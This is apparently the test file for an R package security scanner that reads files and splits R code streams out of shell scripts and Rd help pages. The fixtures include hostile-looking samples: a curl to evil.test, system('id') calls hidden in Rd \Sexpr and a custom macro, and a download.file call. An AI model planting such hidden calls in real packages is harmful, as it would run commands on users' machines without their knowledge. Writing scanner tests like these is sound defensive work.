# read_code() is the only place the scan touches a file being audited, so the
# limits protecting against hostile input are pinned here.

scratch_file <- function(lines, name = "configure") {
  dir <- tempfile("rc")
  dir.create(dir)
  path <- file.path(dir, name)
  writeLines(lines, path)
  path
}

test_that("read_code() returns the file's lines and no error", {
  path <- scratch_file(c("#!/bin/sh", "echo hi"))
  on.exit(unlink(dirname(path), recursive = TRUE), add = TRUE)

  res <- read_code(path)
  expect_named(res, c("lines", "error"))
  expect_equal(res$lines, c("#!/bin/sh", "echo hi"))
  expect_null(res$error)
})

test_that("read_code() handles an empty file", {
  path <- scratch_file(character(0L))
  on.exit(unlink(dirname(path), recursive = TRUE), add = TRUE)

  res <- read_code(path)
  expect_equal(res$lines, character(0L))
  expect_null(res$error)
})

test_that("read_code() reports an unreadable file and returns no lines", {
  res <- read_code(file.path(tempfile(), "configure"))
  expect_null(res$lines)
  expect_type(res$error, "character")
})

test_that("read_code() refuses a file above the scanning limit", {
  path <- file.path(tempfile("rc"), "configure")
  dir.create(dirname(path))
  on.exit(unlink(dirname(path), recursive = TRUE), add = TRUE)
  writeLines(c(strrep("x", .max_scan_bytes), "curl https://evil.test/x"), path)

  res <- read_code(path)
  # Nothing is returned, so nothing downstream can report a match from a file
  # that was never examined.
  expect_null(res$lines)
  expect_match(res$error, "scanning limit")
})

test_that("read_code() blanks invalid UTF-8 lines, keeping later line numbers", {
  path <- file.path(tempfile("rc"), "configure")
  dir.create(dirname(path))
  on.exit(unlink(dirname(path), recursive = TRUE), add = TRUE)
  # A lone 0xFF byte is not valid UTF-8 in any position.
  writeBin(c(charToRaw("curl a\n"), as.raw(0xFF), charToRaw(" curl b\n"),
             charToRaw("curl c\n")), path)

  res <- read_code(path)
  expect_length(res$lines, 3L)
  expect_equal(res$lines[[2L]], "")
  # Line 3 is still line 3, so a finding there points at the right line.
  expect_equal(res$lines[[3L]], "curl c")
  expect_match(res$error, "not valid UTF-8")
})

test_that("read_code() rejects a non-string path", {
  expect_error(read_code(c("a", "b")), "length\\(path\\)")
})

# .read_streams() --------------------------------------------------------------
test_that(".read_streams() gives one R stream for an R file", {
  path <- scratch_file("system('id')", "zzz.R")
  on.exit(unlink(dirname(path), recursive = TRUE), add = TRUE)

  res <- .read_streams(path, "R", "R/zzz.R")
  expect_length(res$streams, 1L)
  expect_equal(res$streams[[1L]]$language, "R")
  expect_true(is.na(res$streams[[1L]]$context))
  expect_equal(res$streams[[1L]]$lines, "system('id')")
  expect_equal(nrow(res$errors), 0L)
})

test_that(".read_streams() gives a shell stream for shell and make files", {
  path <- scratch_file("curl x")
  on.exit(unlink(dirname(path), recursive = TRUE), add = TRUE)

  for (type in c("shell", "make")) {
    res <- .read_streams(path, type, "configure")
    expect_length(res$streams, 1L)
    expect_equal(res$streams[[1L]]$language, "shell")
  }
})

test_that(".read_streams() splits a help file into its two code streams", {
  path <- scratch_file(c("\\name{f}", "\\title{F \\Sexpr{system('uname')}}",
                         "\\description{d}", "\\examples{",
                         "download.file('http://x', 'y')", "}"), "f.Rd")
  on.exit(unlink(dirname(path), recursive = TRUE), add = TRUE)

  res <- .read_streams(path, "Rd", "man/f.Rd")
  expect_length(res$streams, 2L)
  contexts <- vapply(res$streams, `[[`, character(1L), "context")
  expect_equal(contexts, c("Rd_examples", "Rd_Sexpr"))
  expect_true(all(vapply(res$streams, `[[`, character(1L), "language") == "R"))

  # Each stream stays aligned to the .Rd, so a pattern keeps its true line.
  examples <- res$streams[[which(contexts == "Rd_examples")]]$lines
  expect_equal(grep("download.file", examples), 5L)
  sexpr <- res$streams[[which(contexts == "Rd_Sexpr")]]$lines
  expect_equal(grep("system", sexpr), 2L)
})

test_that(".read_streams() yields no stream for a type with no reader", {
  path <- scratch_file("anything", "NEWS.md")
  on.exit(unlink(dirname(path), recursive = TRUE), add = TRUE)

  res <- .read_streams(path, "other", "NEWS.md")
  expect_length(res$streams, 0L)
  expect_equal(nrow(res$errors), 0L)
})

test_that(".read_streams() records a read failure against the file", {
  res <- .read_streams(file.path(tempfile(), "zzz.R"), "R", "R/zzz.R")
  expect_length(res$streams, 0L)
  expect_equal(res$errors$stage, "read_code")
  expect_equal(res$errors$file_context, "R/zzz.R")
})

test_that(".read_streams() expands Rd macros when given them", {
  pkg <- tempfile("mp")
  dir.create(file.path(pkg, "man", "macros"), recursive = TRUE)
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)
  writeLines("Package: mp", file.path(pkg, "DESCRIPTION"))
  writeLines("\\newcommand{\\bang}{\\Sexpr{system(\"id\")}}",
             file.path(pkg, "man", "macros", "m.Rd"))
  page <- file.path(pkg, "man", "page.Rd")
  writeLines(c("\\name{p}", "\\title{P}", "\\description{Uses \\bang{} here.}"),
             page)

  macros <- tools::loadPkgRdMacros(pkg)
  with_m <- .read_streams(page, "Rd", "man/page.Rd", macros)
  expect_length(with_m$streams, 1L)
  expect_match(paste(with_m$streams[[1L]]$lines, collapse = "\n"), "system")

  # Without macros the code is invisible and the unknown macro is recorded.
  without <- .read_streams(page, "Rd", "man/page.Rd", NULL)
  expect_length(without$streams, 0L)
  expect_equal(without$errors$stage, "extract_Rd_code")
  expect_match(without$errors$message, "unknown macro")
})
